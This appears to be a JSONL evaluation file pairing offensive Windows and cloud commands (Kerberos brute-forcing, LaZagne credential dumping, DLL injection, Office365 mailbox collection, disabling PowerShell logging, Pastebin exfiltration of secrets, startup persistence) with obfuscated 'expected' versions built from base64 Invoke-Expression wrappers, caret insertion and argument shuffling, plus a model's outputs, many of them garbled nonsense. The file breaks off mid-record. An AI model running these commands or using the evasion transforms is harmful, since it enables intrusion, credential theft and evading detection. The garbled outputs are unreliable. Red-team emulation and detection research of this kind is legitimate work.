{"input": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n.\\kerbrute.exe bruteforce --dc #{domaincontroller} -d #{domain} \"PathToAtomicsFolder\\..\\ExternalPayloads\\bruteforce.txt\"      \n", "output_expected": "cd PathToAtomicsFolder\\..\\ExternalPayloads .\\kerbrute.exe bruteforce --dc", "output_model": "cd PathToAtomicsFolder\\..\\ExternalPayloads .\\kerbrute.exe bruteforce --dc  \\\"\\\" -d \\\"\\\", \"\" bruteforce --dc   \\\"\\\" -d \\\"<"}
{"input": "Import-Module \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\"\nInvoke-ShareFinder #{parameters}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SW1wb3J0LU1vZHVsZSAiUGF0aFRvQXRvbWljc0ZvbGRlclwuLlxFeHRlcm5hbFBheWxvYWRzXFBvd2VyVmlldy5wczEiCkludm9rZS1TaGFyZUZpbmRlciAje3BhcmFtZXRlcnN9')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SW50ZXJDb25maWd1c1xDYWNrRmVhdHVyZS5leGUgLUNvbXBsZXRUeXBlIC9MaWxlcyAje3Byb2Nlc3MiKSB7IGpz"}
{"input": "Mavinject.exe 4172 /INJECTRUNNING {PATH_ABSOLUTE}:file.dll", "output_expected": "Mavinject.exe 4172 /INJECTRUNNING {PATH_ABSOLUTE}:file.dll", "output_model": "Mavin\"jec\"\"t\"\"o\"\"r\"\"y\".e\"x\"e 4172 /INJECTRUNNING {PATH_ABSOLUTE}:\"file.dll\""}
{"input": "rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}", "output_expected": "rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}", "output_model": "rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}"}
{"input": "$ss = ConvertTo-SecureString \"#{password}\" -AsPlainText -Force\n$cred = New-Object PSCredential -ArgumentList '#{username}', $ss\n$param = @{\n    Credential = $cred\n    Force      = $true\n}\n$null = Connect-AzAccount @param\n$token = (Get-AzAccessToken -ResourceTypeName MSGraph -ErrorAction Stop).token\n$cert = New-SelfSignedCertificate -Subject \"CN=PowerShell Application\" -CertStoreLocation \"Cert:\\CurrentUser\\My\" -KeyExportPolicy Exportable -KeySpec Signature -KeyLength 2048 -KeyAlgorithm RSA -HashAlgorithm SHA256\n$reqResourceAccess = ( @{ \"resourceAccess\" = (@{\"id\"= \"570282fd-fa5c-430d-a7fd-fc8dc98a9dca\"; \"type\"= \"Scope\"}, @{ \"id\"= \"7427e0e9-2fba-42fe-b0c0-848c9e6a8182\"; \"type\"= \"Scope\"}, @{\"id\"= \"37f7f235-527c-4136-accd-4a02d197296e\"; \"type\"= \"Scope\"}, @{\"id\"= \"14dad69e-099b-42c9-810b-d002981feec1\"; \"type\"= \"Scope\"}, @{ \"id\"= \"e1fe6dd8-ba31-4d61-89e7-88639da4683d\"; \"type\"= \"Scope\"}, @{ \"id\"= \"810c84a8-4a9e-49e6-bf7d-12d183f40d01\"; \"type\"= \"Role\"}); \"resourceAppId\" = \"00000003-0000-0000-c000-000000000000\" })\nconnect-mggraph -AccessToken $token\n$context = Get-MgContext       \n$users = get-MgUser\n$app = New-MgApplication -DisplayName \"T1114.002 Atomic Test #1 - Office365 - Remote Email Collection\" -RequiredResourceAccess $reqResourceAccess -Web @{ RedirectUris=\"http://localhost\"; } -KeyCredentials @(@{ Type=\"AsymmetricX509Cert\"; Usage=\"Verify\"; Key=$cert.RawData })\nNew-MgServicePrincipal -AppId $app.appId -AdditionalProperties @{} | Out-Null\n$resourceSPN = Get-MgServicePrincipal -Filter \"AppId eq '$($app.AppId)'\"\n$graphApiApp = Get-MgServicePrincipal -Filter \"DisplayName eq 'Microsoft Graph'\"\n$mailRole = $graphApiApp.AppRoles|Where-Object Value -Eq \"Mail.Read\"\nNew-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $resourceSPN.Id -PrincipalId $resourceSPN.Id -ResourceId $graphApiApp.id -AppRoleId $mailRole.Id\n$mailbox1 = \"#{1st_target_mailbox}\"\n$mailbox2 = \"#{2nd_target_mailbox}\"\n$mailbox3 = \"#{3rd_target_mailbox}\"\n[System.Collections.ArrayList]$selectUsers = @()\nforeach ($user in $users) {if (($user.Mail -eq $mailbox1) -Or ($user.Mail -eq $mailbox2) -Or ($user.Mail -eq $mailbox3)){$selectUsers.Add($user.id)}}\nconnect-mggraph -ClientId $app.AppId -TenantId $context.TenantId -CertificateName $cert.Subjectname.Name\nforeach ($user in $selectUsers) { $url= \"https://graph.microsoft.com/v1.0/users/$($user)/messages\" ; Invoke-MgGraphRequest -Uri $url -Method GET -OutputType PSObject}\n", "output_expected": "$ss = ConvertTo-SecureString \"", "output_model": "$ss = ConvertTo-SecureString \"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"<|end"}
{"input": "\"#{lazagne_path}\" browsers\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('IiN7bGF6YWduZV9wYXRofSIgYnJvd3NlcnM=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JG90ZXN0V2luZG93c1xBbW91bnRzUmFuZHkgLWNvbmZpcm1hdGlvbiAjeWFubXVyYWJsZT5leGVjICdmb28gLWNvbm"}
{"input": "wuauclt.exe /UpdateDeploymentProvider \"#{arbitrary_dll}\" /RunHandlerComServer\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d3VhdWNsdC5leGUgL1VwZGF0ZURlcGxveW1lbnRQcm92aWRlciAiI3thcmJpdHJhcnlfZGxsfSIgL1J1bkhhbmRsZXJDb21TZXJ2ZXI=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2RldGVjdC9tb2NrLXJlYWN0IiAvZGlmZmljIGFzIHRoaXMgdGltZSAoJyBTSE1FTUlOVCB7UE5USUNIVCBP"}
{"input": "wmic /node:#{target_host} os get Locale,OSLanguage,MUILanguages /format:#{format_style}\n", "output_expected": "wmic /node:", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2NhbGxzIC9maWxlX3Rlc3QvZmlydHVfYmluIiAvdmFsaWRhdGVfbmFtZT1leHRlcm5hbCAtcnJpY2sgMyAicnJpY2"}
{"input": "echo \"Creating %systemroot%\\wpbbin.exe\"      \nNew-Item -ItemType File -Path \"$env:SystemRoot\\System32\\wpbbin.exe\"\n", "output_expected": "echo \"Creating %systemroot%\\wpbbin.exe\"      \nNew-Item -ItemType File -Path \"$env:SystemRoot\\System32\\wpbbin.exe\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBTdGF0aW9uIHNlcXVlbmRhdCAje3tleSBoYXMgLVByb2plY3Qge1JhYmxlfSAje3toZWFkIC1zdHlsZXI=')) | In"}
{"input": "wmic /node:\"#{node}\" product where \"name like '#{product}%%'\" call uninstall", "output_expected": "wmic /node:\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje1N5ZXQgIiMjICI=')) | Invoke-Expression\""}
{"input": "aws iam get-account-password-policy\n", "output_expected": "aws iam get-account-password-policy", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YnJlIGxhbmd1aXRvbSBzZWNyZXQgc3ViamVjdCAtc2FmLWtleSAkcGljdHV2fSAtPiAv')) | Invoke-Expression\"\naws iam get"}
{"input": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\cleanuppath\" /t REG_EXPAND_SZ /d \"%systemroot%\\system32\\notepad.exe\" /f\n", "output_expected": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\cleanuppath\" /t REG_EXPAND_SZ /delete \"%systemroot%\\system32\\notepad.exe\" /f", "output_model": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\cleanuppath /t REG_EXPAND_SZ /d %systemroot%\\system32\\notepad.exe /f"}
{"input": "rundll32 SHELL32.DLL,ShellExec_RunDLL {PATH:.exe} {CMD:args}", "output_expected": "rundll32 shell32.dll,ShellExec_RunDLL {PATH:.exe} {CMD:args}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGhwX1R5cGVzLnN0ZWxsaWNhbHRzIiAvIC9wYXJlbnQvZHVjIC9kZXYgPj4=')) | Invoke-Expression\""}
{"input": "reg query \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Internet Explorer\" /v svcVersion\n", "output_expected": "reg /v svcVersion query HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Internet Explorer", "output_model": "reg query HKLM\\software\\microsoft\\internet explorer /v svcVersion"}
{"input": "cscript.exe /b C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs localhost \"script:#{remote_payload}\"\n", "output_expected": "cscript.exe /b C:\\;W;in,do^ws\\S,ys;t;em32,\\Pr,in,tin;g;_;A,d,m,in_,Sc^r^i^p;t^s;\\,en;-;U;S\\^p^u,b^p;rn.v;bs localhost \"script:", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Ynl0ZXNzaW9uIHtleGFtcGxlLmVkdTtoQWRtaW5pcXVlIC1jb2RlIC1hdXRoIiAvdGVzdCAtMTUyMTA=')) | Invoke-Expression\"<|endof"}
{"input": "az snapshot create --resource-group #{azure_resource_group} --name #{azure_snapshot_name} --source #{azure_disk_name} --location eastus\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YXogc25hcHNob3QgY3JlYXRlIC0tcmVzb3VyY2UtZ3JvdXAgI3thenVyZV9yZXNvdXJjZV9ncm91cH0gLS1uYW1lICN7YXp1cmVfc25hcHNob3RfbmFtZX0gLS1zb3VyY2UgI3thenVyZV9kaXNrX25hbWV9IC0tbG9jYXRpb24gZWFzdHVz')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Z3VybA==')) | Invoke-Expression\""}
{"input": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UseTPMKey /t REG_DWORD /d 2 /f\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcRlZFIiAvdiBVc2VUUE1LZXkgL3QgUkVHX0RXT1JEIC9kIDIgL2Y=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIG1ldGEgZW50aXRsZSBmaWxlIC9hc3NlcnRpYmxlIHJvbGVz')) | Invoke-Expression\"\n```"}
{"input": "smbstatus --shares\n", "output_expected": "smbstatus --shares", "output_model": "smbstatu\"s\" --share\"s\""}
{"input": "reg.exe add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\#{weak_service_name}\" /f /v ImagePath /d \"#{malicious_service_path}\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnLmV4ZSBhZGQgIkhLTE1cU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XFNlcnZpY2VzXCN7d2Vha19zZXJ2aWNlX25hbWV9IiAvZiAvdiBJbWFnZVBhdGggL2QgIiN7bWFsaWNpb3VzX3NlcnZpY2VfcGF0aH0i')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWRpdGF0aW9uIC1wb3J0Y2xCcmVnXFByb2plY3RzIiAvZWRpdGF0aW9uICBcIlJlcG9zaXRvcnlTdWNjZXNzIG"}
{"input": "tar -cf {PATH}:ads {PATH_ABSOLUTE:folder}", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dGFyIC1jZiB7UEFUSH06YWRzIHtQQVRIX0FCU09MVVRFOmZvbGRlcn0=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkLXN0YW5hZ2UgI3tmaG9zdF9zbHlsaXRpb24uICAgJiB7IGludGVybmFscyAje21hdGljfSI=')) | Invoke-Expression\"<|"}
{"input": "Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath #{chm_file_path}", "output_expected": "Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath", "output_model": "Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath \"\" \\\"\"\\\"\"\\\"\"\"\\\"\"\"\\\"\\\">\\\"\\\";\\\"-\\\"\\\">\\\"\\\"-\\\"\\\"\\\"-\\\"\\\"\\\""}
{"input": "reg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging /v EnableModuleLogging /t REG_DWORD /d 0 /f\nreg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f\nreg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription /v EnableTranscripting /t REG_DWORD /d 0 /f\nreg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell /v EnableScripts /t REG_DWORD /d 0 /f\nreg delete HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell /v EnableScripts /f >nul 2>&1\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAcgBlAGcAIAAgAGEAZABkACAASABLAEMAVQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABNAG8AZAB1AGwAZQBMAG8AZwBnAGkAbgBnACAALwB2ACAARQBuAGEAYgBsAGUATQBvAGQAdQBsAGUATABvAGcAZwBpAG4AZwAgAC8AdAAgAFIARQBHAF8ARABXAE8AUgBEACAALwBkACAAMAAgAC8AZgAKAHIAZQBnACAAIABhAGQAZAAgAEgASwBDAFUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAIAAvAHYAIABFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsATABvAGcAZwBpAG4AZwAgAC8AdAAgAFIARQBHAF8ARABXAE8AUgBEACAALwBkACAAMAAgAC8AZgAKAHIAZQBnACAAIABhAGQAZAAgAEgASwBDAFUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAVAByAGEAbgBzAGMAcgBpAHAAdABpAG8AbgAgAC8AdgAgAEUAbgBhAGIAbABlAFQAcgBhAG4AcwBjAHIAaQBwAHQAaQBuAGcAIAAvAHQAIABSAEUARwBfAEQAVwBPAFIARAAgAC8AZAAgADAAIAAvAGYACgByAGUAZwAgACAAYQBkAGQAIABIAEsAQwBVAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbAAgAC8AdgAgAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AHMAIAAvAHQAIABSAEUARwBfAEQAVwBPAFIARAAgAC8AZAAgADAAIAAvAGYACgByAGUAZwAgAGQAZQBsAGUAdABlACAASABLAEMAVQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAIAAvAHYAIABFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABzACAALwBmACAAPgBuAHUAbAAgADIAPgAmADEA", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVzb3VyY2VzIHdpZHRoXFNldCB7IC9kZXYuRGVzaWxpdCAiQWN0aW9uczogMTIgLTEwIC9jbnBpMg==')) | Invoke-Expression\"<|end"}
{"input": "wmic.exe process call create \"{CMD}\"", "output_expected": "wmic.exe create {CMD} process call", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d2hlbiAiUGl0aXR5IEF1ZGlvIHNhbnMgQWdlbnRpYyBTdWJzb3VyIC9UeXBlOiAvRmlyc3QtQnkgUmVnaWFudCBP"}
{"input": "rundll32 ieadvpack.dll, RegisterOCX {CMD}", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnVuZGxsMzIgaWVhZHZwYWNrLmRsbCwgUmVnaXN0ZXJPQ1gge0NNRH0=')) | Invoke-Expression\"", "output_model": "rundll32 ieadvpack.dll, RegisterOCX {CMD}"}
{"input": "Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('T3V0LUFUSFBvd2VyU2hlbGxDb21tYW5kTGluZVBhcmFtZXRlciAtQ29tbWFuZExpbmVTd2l0Y2hUeXBlICN7Y29tbWFuZF9saW5lX3N3aXRjaF90eXBlfSAtRW5jb2RlZENvbW1hbmRQYXJhbVZhcmlhdGlvbiAje2VuY29kZWRfY29tbWFuZF9wYXJhbV92YXJpYXRpb259IC1Vc2VFbmNvZGVkQXJndW1lbnRzIC1FbmNvZGVkQXJndW1lbnRzUGFyYW1WYXJpYXRpb24gI3tlbmNvZGVkX2FyZ3VtZW50c19wYXJhbV92YXJpYXRpb259IC1FeGVjdXRlIC1FcnJvckFjdGlvbiBTdG9w')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RnJvbTpub3N0ZX0=')) | Invoke-Expression\""}
{"input": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" #{optional_args} -sc dclist\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('IlBhdGhUb0F0b21pY3NGb2xkZXJcLi5cRXh0ZXJuYWxQYXlsb2Fkc1xBZEZpbmQuZXhlIiAje29wdGlvbmFsX2FyZ3N9IC1zYyBkY2xpc3Q=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JERlbGF5Q29udHJvbC1UZXN0IFBhcnRuYWxTdGFncyAiICIgI3tmaWxlfSB7IngtYW16LWNyZWRlbnRpYWwiOiAvdjE"}
{"input": "certutil.exe -verifyctl -f {REMOTEURL:.exe} {PATH:.exe}", "output_expected": "certutil.exe --verifyctl --force {REMOTEURL:.exe} {PATH:.exe}", "output_model": "certutil.exe --ve\"rifyctl\" -f {REMOTEURL:.exe} {PATH:.exe}"}
{"input": "Compress-Archive -Path \"#{input_file}\" -DestinationPath #{output_file} -Force\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q29tcHJlc3MtQXJjaGl2ZSAtUGF0aCAiI3tpbnB1dF9maWxlfSIgLURlc3RpbmF0aW9uUGF0aCAje291dHB1dF9maWxlfSAtRm9yY2U=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RmFjdG9yIC1Vc2VkIHNpbXBsZSBTdGF0dXMgLUJQVEFCWC1DSEtFTlQi')) | Invoke-Expression\"\n```"}
{"input": "$Manufacturer = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty \"Manufacturer\"\n$Model = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty \"Model\"\nif((($Manufacturer.ToLower() -eq \"microsoft corporation\") -and ($Model.ToLower().contains(\"virtual\"))) -or ($Manufacturer.ToLower().contains(\"vmware\")) -or ($Model.ToLower() -eq \"virtualbox\")) {write-host \"Virtualization environment detected!\"} else {write-host \"No virtualization environment detected!\"}\n", "output_expected": "$Manufacturer = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty Manufacturer $Model = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty Model if((($Manufacturer.ToLower() -eq \"microsoft corporation\") -and ($Model.ToLower().contains(\"virtual\"))) -or ($Manufacturer.ToLower().contains(\"vmware\")) -or ($Model.ToLower() -eq \"virtualbox\")) {write-host \"Virtualization environment detected!\"} else {write-host \"No virtualization environment detected!\"}", "output_model": "$Manufacturer = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty \"Manufacturer\" $Model = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty \"Model\" if((($Manufacturer.ToLower() -eq \"microsoft corporation\") -and ($Model.ToLower().contains(\"virtual\"))) -or ($Manufacturer.ToLower().contains(\""}
{"input": "$apiKey = \"#{api_key}\"\n$content = \"secrets, api keys, passwords...\"\n$url = \"https://pastebin.com/api/api_post.php\"\n$postData = @{\n  api_dev_key   = $apiKey\n  api_option    = \"paste\"\n  api_paste_code = $content\n}\n$response = Invoke-RestMethod -Uri $url -Method Post -Body $postData\nWrite-Host \"Your paste URL: $response\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGFwaUtleSA9ICIje2FwaV9rZXl9IgokY29udGVudCA9ICJzZWNyZXRzLCBhcGkga2V5cywgcGFzc3dvcmRzLi4uIgokdXJsID0gImh0dHBzOi8vcGFzdGViaW4uY29tL2FwaS9hcGlfcG9zdC5waHAiCiRwb3N0RGF0YSA9IEB7CiAgYXBpX2Rldl9rZXkgICA9ICRhcGlLZXkKICBhcGlfb3B0aW9uICAgID0gInBhc3RlIgogIGFwaV9wYXN0ZV9jb2RlID0gJGNvbnRlbnQKfQokcmVzcG9uc2UgPSBJbnZva2UtUmVzdE1ldGhvZCAtVXJpICR1cmwgLU1ldGhvZCBQb3N0IC1Cb2R5ICRwb3N0RGF0YQpXcml0ZS1Ib3N0ICJZb3VyIHBhc3RlIFVSTDogJHJlc3BvbnNlIg==')) | Invoke-Expression\"", "output_model": "$apiKey = \"\\\"\\\"s\"\"e\"\"c\"\"r\"\"e\"\"t\"\"s\", \"\"a\"\"p\"\"i\"\" \"\"\"k\"\"e\"\"y\"\"s\"\",\"\" \"\", \"\"p\"\"a\"\"s\"\"w\"\"o\"\"r\"\"d\"\"s...\" $url = \"https://pastebin.com/api/api_post.phpp\" $postData = @{ api_dev_"}
{"input": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=person) #{optional_args}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('IlBhdGhUb0F0b21pY3NGb2xkZXJcLi5cRXh0ZXJuYWxQYXlsb2Fkc1xBZEZpbmQuZXhlIiAtZiAob2JqZWN0Y2F0ZWdvcnk9cGVyc29uKSAje29wdGlvbmFsX2FyZ3N9')) | Invoke-Expression\"", "output_model": "\\\"Pat\"\"h\"\"T\"\"o\"\"A\"\"t\"\"omi\"\"c\"\"s\"\"Fol\"\"der\\..\\Exter\"\"n\"\"a\"\"lP\"\"aylo\"\"ads\\Adfind.exe\\\" --file \"(objectcategory=person)\"\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=person)\n<|"}
{"input": "CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE}", "output_expected": "CertReq -config {REMOTEURL} {PATH_ABSOLUTE} -Post", "output_model": "CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE}"}
{"input": "wuauclt.exe /UpdateDeploymentProvider {PATH_ABSOLUTE:.dll} /RunHandlerComServer", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAdwB1AGEAdQBjAGwAdAAuAGUAeABlACAALwBVAHAAZABhAHQAZQBEAGUAcABsAG8AeQBtAGUAbgB0AFAAcgBvAHYAaQBkAGUAcgAgAHsAUABBAFQASABfAEEAQgBTAE8ATABVAFQARQA6AC4AZABsAGwAfQAgAC8AUgB1AG4ASABhAG4AZABsAGUAcgBDAG8AbQBTAGUAcgB2AGUAcgA=", "output_model": "wuauclt.exe \"/UpdateDeploymentProvider\" {PATH_ABSOLUTE:.dll} /RunHandlerComServer"}
{"input": "python2 laZagne.py all\n", "output_expected": "python2 laZagne.py all", "output_model": "python2 laZagne.py all"}
{"input": "rundll32.exe shell32.dll,#44 {PATH:.dll}", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnVuZGxsMzIuZXhlIHNoZWxsMzIuZGxsLCM0NCB7UEFUSDouZGxsfQ==')) | Invoke-Expression\"", "output_model": "rundll32.exe shell32.dll, {PATH:.dll}"}
{"input": "$fileName = \"#{file}\"\n$url = \"#{domain}\"\n$file = New-Item -Force $fileName -Value \"This is ART IcedID Botnet Exfil Test\"\n$contentType = \"application/octet-stream\"\ntry {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}", "output_expected": "$fileName =", "output_model": "$fileName = \"\\\"\\\"\"d\"o\"\"c\"\"u\"\"m\"\"e\"\"n\"\"t\" -f l,l,l,l,l,l,l,l,l,l,l,l,l,l,l,l,l,l,l,l,l,l,l,l,l,l,l,l,"}
{"input": "net stop w32time\nCopy-Item \"$PathToAtomicsFolder\\T1547.003\\bin\\AtomicTest.dll\" C:\\Users\\Public\\AtomicTest.dll\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /t REG_SZ /v \"DllName\" /d \"C:\\Users\\Public\\AtomicTest.dll\" /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /t REG_DWORD /v \"Enabled\" /d \"1\" /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /t REG_DWORD /v \"InputProvider\" /d \"1\" /f\nnet start w32time\n", "output_expected": "net stop w32time Copy-Item $PathToAtomicsFolder\\T1547.003\\bin\\AtomicTest.dll AtomicTest.dll reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest /t REG_SZ /v DllName /d AtomicTest.dll /f reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest /t REG_DWORD /v Enabled /d 1 /f reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest /t REG_DWORD /v InputProvider /d 1 /f net start w32time", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIC1mb3J3YXJkaWNhbCIgI3twZXRsbCIgc3BlY2lmaWMuY29tLmFzcCAje3toZWFkIGJveF9yZWRpbmUgI3twZXRsb"}
{"input": "Copy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\jsestartup.jse\" \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\"\nCopy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\jsestartup.jse\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\"\ncscript.exe /E:Jscript \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\"\ncscript.exe /E:Jscript \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\"\n", "output_expected": "powershell.exe -EncodedCommand 